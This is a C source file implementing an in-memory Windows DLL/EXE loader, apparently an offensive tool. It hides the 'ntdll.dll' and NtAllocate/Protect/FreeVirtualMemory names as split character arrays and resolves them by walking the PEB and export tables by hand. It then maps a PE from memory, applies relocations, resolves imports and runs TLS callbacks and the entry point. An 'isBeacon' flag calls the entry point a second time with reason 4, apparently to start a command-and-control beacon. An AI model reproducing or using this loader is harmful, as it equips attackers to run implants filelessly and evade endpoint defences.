#include "DllMemLdr.h"

#include <stdio.h>


WCHAR wLdrntdll[] = {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0'};
WCHAR cLdrAllocateVirtualMemory[] = {'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
WCHAR cLdrProtectVirtualMemory[] = {'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
WCHAR cLdrFreeVirtualMemory[] = {'N', 't', 'F', 'r', 'e', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};

LDR_API ldrApi = { 0 };
PLDR_API API = &ldrApi;

// Used for checking case-sensitive library names
BOOL LdrIsStringEqual (IN LPCWSTR Str1, IN LPCWSTR Str2) {

    WCHAR   lStr1	[MAX_PATH],
            lStr2	[MAX_PATH];

    int		len1	= lstrlenW(Str1),
            len2	= lstrlenW(Str2);

    int		i		= 0,
            j		= 0;

    // Checking length. We dont want to overflow the buffers
    if (len1 >= MAX_PATH || len2 >= MAX_PATH)
        return FALSE;

    // Converting Str1 to lower case string (lStr1)
    for (i = 0; i < len1; i++){
        lStr1[i] = (WCHAR)tolower(Str1[i]);
    }
    lStr1[i++] = L'\0'; // null terminating

    // Converting Str2 to lower case string (lStr2)
    for (j = 0; j < len2; j++) {
        lStr2[j] = (WCHAR)tolower(Str2[j]);
    }
    lStr2[j++] = L'\0'; // null terminating

    // Comparing the lower-case strings
    if (lstrcmpiW(lStr1, lStr2) == 0)
        return TRUE;

    return FALSE;
}

HMODULE LdrGetModuleHandleC(IN LPCWSTR szModuleName) {

    // 64 bit
    PLDR_TEB_A pTib = (PLDR_TEB_A)NtCurrentTeb();
    LDR_PEB_A* pPeb = (PLDR_PEB_A)pTib->ProcessEnvironmentBlock;
    // Getting Ldr
    PPEB_LDR_DATA		    pLdr	= (PPEB_LDR_DATA)(pPeb->Ldr);

    // Getting the first element in the linked list which contains information about the first module
    PLDR_DATA_TABLE_ENTRY	pDte	= (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    while (pDte) {

        // If not null
        if (pDte->FullDllName.Length != 0) {
            // Print the DLL name
            if (LdrIsStringEqual(pDte->FullDllName.Buffer, szModuleName)) {
                return (HMODULE)pDte->Reserved2[0];
            }

        }
        else {
            break;
        }

        // Next element in the linked list
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

    }
    // Return NULL if not found
    return NULL;
}

PVOID LdrGetProcAddressC(HMODULE hModule, LPCWSTR lpProcName) {

    // Create LoadLibrary to test if module is loaded

    // IMPORTANT - Must cast handle address to PBYTE or header parsing will fail
    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if(pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    if (ImgOptHdr.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
        return NULL;
    }

    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    // Getting the function's names array pointer
    PDWORD FunctionNameArray 	= (PDWORD)(pBase + pImgExportDir->AddressOfNames);

    // Getting the function's addresses array pointer
    PDWORD FunctionAddressArray 	= (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);

    // Getting the function's ordinal array pointer
    PWORD  FunctionOrdinalArray 	= (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        // Getting the name of the function
        CHAR *pFunctionName = (CHAR *) (pBase + FunctionNameArray[i]);
        int wideCharSize = MultiByteToWideChar(CP_UTF8, 0, pFunctionName, -1, NULL, 0); // TODO Create custom MultiByteToWideChar or find proxy
        WCHAR wideName[wideCharSize];
        MultiByteToWideChar(CP_UTF8, 0, pFunctionName, -1, wideName, wideCharSize);
        // Getting the address of the function
        PVOID pFunctionAddress = (PVOID) (pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
        // Getting the ordinal of the function
        //WORD wFunctionOrdinal = FunctionOrdinalArray[i];

        if (wcscmp((LPCWSTR) lpProcName, wideName) == 0) {
            // Return function address
            return pFunctionAddress;
        }
    }
    return NULL;
}

BOOL LoadLdrAPI() {
    // Virtual Memory
    API->VirtualAlloc = (fnLdrNtAllocateVirtualMemory)LdrGetProcAddressC(LdrGetModuleHandleC(wLdrntdll), cLdrAllocateVirtualMemory);
    if (API->VirtualAlloc == NULL) {
        return FALSE;
    }
    API->VirtualProtect = (fnLdrNtProtectVirtualMemory)LdrGetProcAddressC(LdrGetModuleHandleC(wLdrntdll), cLdrProtectVirtualMemory);
    if (API->VirtualProtect == NULL) {
        return FALSE;
    }
    API->VirtualFree = (fnLdrNtFreeVirtualMemory)LdrGetProcAddressC(LdrGetModuleHandleC(wLdrntdll), cLdrFreeVirtualMemory);
    if (API->VirtualFree == NULL) {
        return FALSE;
    }
    return TRUE;
}
struct ExportNameEntry {
    LPCSTR name;
    WORD idx;
};

typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
typedef int (WINAPI *ExeEntryProc)(void);

#ifdef _WIN64
typedef struct POINTER_LIST {
    struct POINTER_LIST *next;
    void *address;
} POINTER_LIST;
#endif

typedef struct {
    PIMAGE_NT_HEADERS headers;
    PBYTE codeBase;
    HCUSTOMMODULE *modules;
    int numModules;
    BOOL initialized;
    BOOL isDLL;
    BOOL isRelocated;
    struct ExportNameEntry *nameExportsTable;
    void *userdata;
    ExeEntryProc exeEntry;
    DWORD pageSize;
#ifdef _WIN64
    POINTER_LIST *blockedMemory;
#endif
} MEMORYMODULE, *PMEMORYMODULE;

typedef struct {
    LPVOID address;
    LPVOID alignedAddress;
    SIZE_T size;
    DWORD characteristics;
    BOOL last;
} SECTIONFINALIZEDATA, *PSECTIONFINALIZEDATA;

#define GET_HEADER_DICTIONARY(module, idx)  &(module)->headers->OptionalHeader.DataDirectory[idx]

static inline uintptr_t
AlignValueDown(uintptr_t value, uintptr_t alignment) {
    return value & ~(alignment - 1);
}

static inline LPVOID
AlignAddressDown(LPVOID address, uintptr_t alignment) {
    return (LPVOID) AlignValueDown((uintptr_t) address, alignment);
}

static inline size_t
AlignValueUp(size_t value, size_t alignment) {
    return (value + alignment - 1) & ~(alignment - 1);
}

static inline void*
OffsetPointer(void* data, ptrdiff_t offset) {
    return (void*) ((uintptr_t) data + offset);
}

PWCHAR ConvertPCHARToPWCHAR(PCHAR ansiStr) {
    if (ansiStr == NULL) {
        return NULL;
    }

    // Get the required buffer size for the wide string
    int size = MultiByteToWideChar(CP_ACP, 0, ansiStr, -1, NULL, 0);
    if (size == 0) {
        return NULL; // Handle error
    }

    // Allocate memory for the wide string
    PWCHAR wideStr = (PWCHAR)malloc(size * sizeof(WCHAR));
    if (wideStr == NULL) {
        return NULL; // Handle memory allocation failure
    }

    // Perform the conversion
    MultiByteToWideChar(CP_ACP, 0, ansiStr, -1, wideStr, size);

    return wideStr;
}

#ifdef _WIN64
static void
FreePointerList(POINTER_LIST *head)
{
    POINTER_LIST *node = head;
    while (node) {
        POINTER_LIST *next;
        VirtualFree(node->address, 0, MEM_RELEASE);
        next = node->next;
        free(node);
        node = next;
    }
}
#endif

static BOOL
CheckSize(size_t size, size_t expected) {
    if (size < expected) {
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    return TRUE;
}

static BOOL
CopySections(const PBYTE data, size_t size, PIMAGE_NT_HEADERS old_headers, PMEMORYMODULE module)
{
    PBYTE codeBase = module->codeBase;
    PBYTE dest;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module->headers);
    for (int i=0; i<module->headers->FileHeader.NumberOfSections; i++, section++) {
        if (!CheckSize(size, section->PointerToRawData + section->SizeOfRawData)) {
            return FALSE;
        }
        // Always use position from file to support alignments smaller
        // than page size (allocation above will align to page size).
        dest = codeBase + section->VirtualAddress;

        _LDR_MEMCPY_(dest, data + section->PointerToRawData, section->SizeOfRawData);
        // NOTE: On 64bit systems we truncate to 32bit here but expand
        section->Misc.PhysicalAddress = (DWORD) ((uintptr_t) dest & 0xffffffff);
    }

    return TRUE;
}

// Protection flags for memory pages (Executable, Readable, Writeable)
static int ProtectionFlags[2][2][2] = {
    {
        // not executable
        {PAGE_NOACCESS, PAGE_WRITECOPY},
        {PAGE_READONLY, PAGE_READWRITE},
    }, {
        // executable
        {PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY},
        {PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE},
    },
};

static SIZE_T
GetRealSectionSize(PMEMORYMODULE module, PIMAGE_SECTION_HEADER section) {
    DWORD size = section->SizeOfRawData;
    if (size == 0) {
        if (section->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA) {
            size = module->headers->OptionalHeader.SizeOfInitializedData;
        } else if (section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) {
            size = module->headers->OptionalHeader.SizeOfUninitializedData;
        }
    }
    return (SIZE_T) size;
}

static BOOL
FinalizeSection(PMEMORYMODULE module, PSECTIONFINALIZEDATA sectionData) {
    DWORD protect, oldProtect;
    BOOL executable;
    BOOL readable;
    BOOL writeable;

    if (sectionData->size == 0) {
        return TRUE;
    }

    if (sectionData->characteristics & IMAGE_SCN_MEM_DISCARDABLE) {
        // section is not needed any more and can safely be freed
        if (sectionData->address == sectionData->alignedAddress &&
            (sectionData->last ||
             module->headers->OptionalHeader.SectionAlignment == module->pageSize ||
             (sectionData->size % module->pageSize) == 0)
           ) {
            // Only allowed to decommit whole pages
            VirtualFree(sectionData->address, sectionData->size, MEM_DECOMMIT);
        }
        return TRUE;
    }

    // determine protection flags based on characteristics
    executable = (sectionData->characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    readable =   (sectionData->characteristics & IMAGE_SCN_MEM_READ) != 0;
    writeable =  (sectionData->characteristics & IMAGE_SCN_MEM_WRITE) != 0;
    protect = ProtectionFlags[executable][readable][writeable];
    if (sectionData->characteristics & IMAGE_SCN_MEM_NOT_CACHED) {
        protect |= PAGE_NOCACHE;
    }

    // change memory access flags
    if (VirtualProtect(sectionData->address, sectionData->size, protect, &oldProtect) == 0) {
        return FALSE;
    }

    return TRUE;
}

static BOOL
FinalizeSections(PMEMORYMODULE module)
{
    int i;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module->headers);
    // "PhysicalAddress" might have been truncated to 32bit above, expand to
    // 64bits again.
    uintptr_t imageOffset = ((uintptr_t) module->headers->OptionalHeader.ImageBase & 0xffffffff00000000);

    SECTIONFINALIZEDATA sectionData;
    sectionData.address = (LPVOID)((uintptr_t)section->Misc.PhysicalAddress | imageOffset);
    sectionData.alignedAddress = AlignAddressDown(sectionData.address, module->pageSize);
    sectionData.size = GetRealSectionSize(module, section);
    sectionData.characteristics = section->Characteristics;
    sectionData.last = FALSE;
    section++;

    // loop through all sections and change access flags
    for (i=1; i<module->headers->FileHeader.NumberOfSections; i++, section++) {
        LPVOID sectionAddress = (LPVOID)((uintptr_t)section->Misc.PhysicalAddress | imageOffset);
        LPVOID alignedAddress = AlignAddressDown(sectionAddress, module->pageSize);
        SIZE_T sectionSize = GetRealSectionSize(module, section);
        if (sectionData.alignedAddress == alignedAddress || (uintptr_t) sectionData.address + sectionData.size > (uintptr_t) alignedAddress) {
            // Section shares page with previous
            if ((section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0 || (sectionData.characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0) {
                sectionData.characteristics = (sectionData.characteristics | section->Characteristics) & ~IMAGE_SCN_MEM_DISCARDABLE;
            } else {
                sectionData.characteristics |= section->Characteristics;
            }
            sectionData.size = (((uintptr_t)sectionAddress) + ((uintptr_t) sectionSize)) - (uintptr_t) sectionData.address;
            continue;
        }

        if (!FinalizeSection(module, &sectionData)) {
            return FALSE;
        }
        sectionData.address = sectionAddress;
        sectionData.alignedAddress = alignedAddress;
        sectionData.size = sectionSize;
        sectionData.characteristics = section->Characteristics;
    }
    sectionData.last = TRUE;
    if (!FinalizeSection(module, &sectionData)) {
        return FALSE;
    }
    return TRUE;
}

static BOOL
ExecuteTLS(PMEMORYMODULE module)
{
    PBYTE codeBase = module->codeBase;
    PIMAGE_TLS_DIRECTORY tls;
    PIMAGE_TLS_CALLBACK* callback;

    PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_TLS);
    if (directory->VirtualAddress == 0) {
        return TRUE;
    }

    tls = (PIMAGE_TLS_DIRECTORY) (codeBase + directory->VirtualAddress);
    callback = (PIMAGE_TLS_CALLBACK *) tls->AddressOfCallBacks;
    if (callback) {
        while (*callback) {
            (*callback)((LPVOID) codeBase, DLL_PROCESS_ATTACH, NULL);
            callback++;
        }
    }
    return TRUE;
}

static BOOL
PerformBaseRelocation(PMEMORYMODULE module, ptrdiff_t delta)
{
    PBYTE codeBase = module->codeBase;
    PIMAGE_BASE_RELOCATION relocation;

    PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    if (directory->Size == 0) {
        return (delta == 0);
    }

    relocation = (PIMAGE_BASE_RELOCATION) (codeBase + directory->VirtualAddress);
    for (; relocation->VirtualAddress > 0; ) {
        DWORD i;
        PBYTE dest = codeBase + relocation->VirtualAddress;
        PWORD relInfo = (PWORD) OffsetPointer(relocation, IMAGE_SIZEOF_BASE_RELOCATION);
        for (i=0; i<((relocation->SizeOfBlock-IMAGE_SIZEOF_BASE_RELOCATION) / 2); i++, relInfo++) {
            // the upper 4 bits define the type of relocation
            int type = *relInfo >> 12;
            // the lower 12 bits define the offset
            int offset = *relInfo & 0xfff;

            switch (type)
            {
            case IMAGE_REL_BASED_ABSOLUTE:
                // skip relocation
                break;

            case IMAGE_REL_BASED_HIGHLOW:
                // change complete 32 bit address
                {
                    DWORD *patchAddrHL = (DWORD *) (dest + offset);
                    *patchAddrHL += (DWORD) delta;
                }
                break;

            case IMAGE_REL_BASED_DIR64:
                {
                    ULONGLONG *patchAddr64 = (ULONGLONG *) (dest + offset);
                    *patchAddr64 += (ULONGLONG) delta;
                }
                break;

            default:
                break;
            }
        }

        // advance to next relocation block
        relocation = (PIMAGE_BASE_RELOCATION) OffsetPointer(relocation, relocation->SizeOfBlock);
    }
    return TRUE;
}

static BOOL
BuildImportTable(PMEMORYMODULE module)
{
    PBYTE codeBase = module->codeBase;
    PIMAGE_IMPORT_DESCRIPTOR importDesc;
    BOOL result = TRUE;

    PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (directory->Size == 0) {
        return TRUE;
    }

    importDesc = (PIMAGE_IMPORT_DESCRIPTOR) (codeBase + directory->VirtualAddress);
    for (; !IsBadReadPtr(importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && importDesc->Name; importDesc++) {
        uintptr_t *thunkRef;
        FARPROC *funcRef;
        HCUSTOMMODULE *tmp;
        HCUSTOMMODULE handle = LoadLibrary((LPCSTR) (codeBase + importDesc->Name));
        if (handle == NULL) {
            SetLastError(ERROR_MOD_NOT_FOUND);
            result = FALSE;
            break;
        }

        tmp = (HCUSTOMMODULE *) realloc(module->modules, (module->numModules+1)*(sizeof(HCUSTOMMODULE)));
        if (tmp == NULL) {
            FreeLibrary(handle);
            SetLastError(ERROR_OUTOFMEMORY);
            result = FALSE;
            break;
        }
        module->modules = tmp;

        module->modules[module->numModules++] = handle;
        if (importDesc->OriginalFirstThunk) {
            thunkRef = (uintptr_t *) (codeBase + importDesc->OriginalFirstThunk);
            funcRef = (FARPROC *) (codeBase + importDesc->FirstThunk);
        } else {
            // no hint table
            thunkRef = (uintptr_t *) (codeBase + importDesc->FirstThunk);
            funcRef = (FARPROC *) (codeBase + importDesc->FirstThunk);
        }
        for (; *thunkRef; thunkRef++, funcRef++) {
            if (IMAGE_SNAP_BY_ORDINAL(*thunkRef)) {
                //PWCHAR pwThunkRef = ConvertPCHARToPWCHAR((LPCSTR)IMAGE_ORDINAL(*thunkRef));
                *funcRef = GetProcAddress(handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
                //*funcRef = LdrGetProcAddressC(handle, pwThunkRef);
            } else {
                PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME) (codeBase + (*thunkRef));
                *funcRef = GetProcAddress(handle, (LPCSTR)&thunkData->Name);
                //PWCHAR pwThunkRef = ConvertPCHARToPWCHAR(&thunkData->Name);
                //*funcRef = LdrGetProcAddressC(handle, pwThunkRef);
            }
            if (*funcRef == 0) {
                result = FALSE;
                break;
            }
        }

        if (!result) {
            FreeLibrary(handle);
            SetLastError(ERROR_PROC_NOT_FOUND);
            break;
        }
    }

    return result;
}


HMEMORYMODULE MemoryLoadLibrary(const PVOID pFileBuffer, SIZE_T zFileSize, BOOL isBeacon)
{
    PMEMORYMODULE result = NULL;
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pOldNtHeaders;
    PIMAGE_SECTION_HEADER pCurrentSection;
    PBYTE code, headers = NULL;
    ptrdiff_t locationDelta;
    SYSTEM_INFO sysInfo;

    DWORD i;
    SIZE_T zOptionalSectionSize;
    SIZE_T zLastSectionEnd = 0;
    SIZE_T zAlignedImageSize;
    POINTER_LIST *blockedMemory = NULL;

    LoadLdrAPI();

    if (!CheckSize(zFileSize, sizeof(IMAGE_DOS_HEADER))) {
        return NULL;
    }
    pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        SetLastError(ERROR_BAD_EXE_FORMAT);
        return NULL;
    }

    if (!CheckSize(zFileSize, pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS))) {
        return NULL;
    }
    pOldNtHeaders = (PIMAGE_NT_HEADERS)&((const PBYTE)(pFileBuffer))[pDosHeader->e_lfanew];
    if (pOldNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        SetLastError(ERROR_BAD_EXE_FORMAT);
        return NULL;
    }

    if (pOldNtHeaders->FileHeader.Machine != HOST_MACHINE) {
        SetLastError(ERROR_BAD_EXE_FORMAT);
        return NULL;
    }

    if (pOldNtHeaders->OptionalHeader.SectionAlignment & 1) {
        // Only support section alignments that are a multiple of 2
        SetLastError(ERROR_BAD_EXE_FORMAT);
        return NULL;
    }

    pCurrentSection = IMAGE_FIRST_SECTION(pOldNtHeaders);
    zOptionalSectionSize = pOldNtHeaders->OptionalHeader.SectionAlignment;
    for (i=0; i<pOldNtHeaders->FileHeader.NumberOfSections; i++, pCurrentSection++) {
        SIZE_T zEndOfSection;
        if (pCurrentSection->SizeOfRawData == 0) {
            // Section without data in the DLL
            zEndOfSection = pCurrentSection->VirtualAddress + zOptionalSectionSize;
        } else {
            zEndOfSection = pCurrentSection->VirtualAddress + pCurrentSection->SizeOfRawData;
        }

        if (zEndOfSection > zLastSectionEnd) {
            zLastSectionEnd = zEndOfSection;
        }
    }

    GetNativeSystemInfo(&sysInfo);
    zAlignedImageSize = AlignValueUp(pOldNtHeaders->OptionalHeader.SizeOfImage, sysInfo.dwPageSize);
    if (zAlignedImageSize != AlignValueUp(zLastSectionEnd, sysInfo.dwPageSize)) {
        SetLastError(ERROR_BAD_EXE_FORMAT);
        return NULL;
    }

    // reserve memory for image of library
    SIZE_T zTempImageSize = zAlignedImageSize;
    LDR_ALLOCATE_VIRTUAL_MEMORY(GetCurrentProcess(), &code, &zTempImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (code == NULL) {
        return FALSE;
    }
    // Memory block may not span 4 GB boundaries.
    while ((((uintptr_t) code) >> 32) < (((uintptr_t) (code + zAlignedImageSize)) >> 32)) {
        POINTER_LIST *node = (POINTER_LIST*) malloc(sizeof(POINTER_LIST));
        if (!node) {
            VirtualFree(code, 0, MEM_RELEASE);
            FreePointerList(blockedMemory);
            SetLastError(ERROR_OUTOFMEMORY);
            return NULL;
        }

        node->next = blockedMemory;
        node->address = code;
        blockedMemory = node;

        zTempImageSize = zAlignedImageSize;
        LDR_ALLOCATE_VIRTUAL_MEMORY(GetCurrentProcess(), &code, &zTempImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

        if (code == NULL) {
            FreePointerList(blockedMemory);
            SetLastError(ERROR_OUTOFMEMORY);
            return NULL;
        }
    }

    result = (PMEMORYMODULE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MEMORYMODULE));
    if (result == NULL) {
        VirtualFree(code, 0, MEM_RELEASE);
        FreePointerList(blockedMemory);
        SetLastError(ERROR_OUTOFMEMORY);
        return NULL;
    }

    result->codeBase = code;
    result->isDLL = (pOldNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
    result->pageSize = sysInfo.dwPageSize;
    result->blockedMemory = blockedMemory;

    if (!CheckSize(zFileSize, pOldNtHeaders->OptionalHeader.SizeOfHeaders)) {
        goto error;
    }

    // Copy to headers pointer
    headers = code;
    // copy PE header to code
    _LDR_MEMCPY_(headers, pDosHeader, pOldNtHeaders->OptionalHeader.SizeOfHeaders);
    result->headers = (PIMAGE_NT_HEADERS)&((const PBYTE)(headers))[pDosHeader->e_lfanew];

    // update position
    result->headers->OptionalHeader.ImageBase = (uintptr_t)code;

    // copy sections from DLL file block to new memory location
    if (!CopySections((const PBYTE) pFileBuffer, zFileSize, pOldNtHeaders, result)) {
        goto error;
    }

    // adjust base address of imported data
    locationDelta = (ptrdiff_t)(result->headers->OptionalHeader.ImageBase - pOldNtHeaders->OptionalHeader.ImageBase);
    if (locationDelta != 0) {
        result->isRelocated = PerformBaseRelocation(result, locationDelta);
    } else {
        result->isRelocated = TRUE;
    }

    // load required dlls and adjust function table of imports
    if (!BuildImportTable(result)) {
        goto error;
    }

    // mark memory pages depending on section headers and release
    // sections that are marked as "discardable"
    if (!FinalizeSections(result)) {
        goto error;
    }

    // TLS callbacks are executed BEFORE the main loading
    if (!ExecuteTLS(result)) {
        goto error;
    }

    // get entry point of loaded library
    BOOL bSuccess = FALSE;
    if (result->headers->OptionalHeader.AddressOfEntryPoint != 0) {
        if (result->isDLL) {
            DllEntryProc DllEntry = (DllEntryProc)(LPVOID)(code + result->headers->OptionalHeader.AddressOfEntryPoint);
            // notify library about attaching to process
            if (isBeacon) {
                bSuccess = (*DllEntry)((HINSTANCE)code, DLL_PROCESS_ATTACH, 0);
                bSuccess = (*DllEntry)((HINSTANCE)code, 4, 0);
            } else {
                 bSuccess = (*DllEntry)((HINSTANCE)code, DLL_PROCESS_ATTACH, 0);
            }

            if (!bSuccess) {
                SetLastError(ERROR_DLL_INIT_FAILED);
                goto error;
            }
            result->initialized = TRUE;
        } else {
            result->exeEntry = (ExeEntryProc)(LPVOID)(code + result->headers->OptionalHeader.AddressOfEntryPoint);
        }
    } else {
        result->exeEntry = NULL;
    }

    return (HMEMORYMODULE)result;

error:
    // cleanup
    return NULL;
}
